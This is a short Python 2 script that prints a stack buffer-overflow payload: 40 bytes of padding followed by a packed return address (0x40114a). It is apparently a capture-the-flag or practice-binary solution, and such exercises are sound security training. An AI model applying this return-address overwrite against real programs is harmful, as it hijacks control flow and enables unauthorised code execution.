#!/usr/bin/env python2
# import fire
import struct
import sys

def main(addr, offset=40):
  data = b'\x00' * offset + struct.pack('<Q', addr)  
  sys.stdout.write(data)
  # sys.stdout.flush()
  sys.stderr.write('wrote: ' + str(len(data)))

main(addr=0x40114a)
